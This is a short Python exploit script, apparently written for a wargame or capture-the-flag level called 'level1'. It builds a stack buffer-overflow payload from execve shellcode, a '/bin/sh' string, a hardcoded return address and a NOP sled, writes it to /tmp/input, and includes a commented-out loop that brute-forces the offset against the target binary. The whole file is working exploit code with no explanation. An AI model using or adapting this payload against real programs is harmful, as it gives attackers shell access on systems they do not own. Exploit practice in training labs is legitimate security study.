#!/usr/bin/python

import sys
import os

shellcode = "\x31\xdb\x31\xd2\x31\xc9\x09\xc3\x09\xd9\x83\xc1\x09\x31\xc0\x80\x31\x90\x31\xc9\xb0\x0b\xcd\x80"
sh = "///bin/sh"
returnAddr = "\x64\xfe\xff\xbf"
nop = "\x90"
A = "A"
nopsled = 200 * nop

if (len(sys.argv) > 1):
	i = int(sys.argv[1])
else:
	i = 0
cmd = "echo \"" + sh + i*nop + returnAddr + nopsled + shellcode + "\" > /tmp/input" #67
os.system(cmd)

#for i in range(0, 200):
#	cmd = "echo \"" + sh + i*nop + returnAddr + nopsled + shellcode + "\" | env - /home/user/level1/level1" #45
#	print("payload[" + str(i) + "]")
#	os.system(cmd)
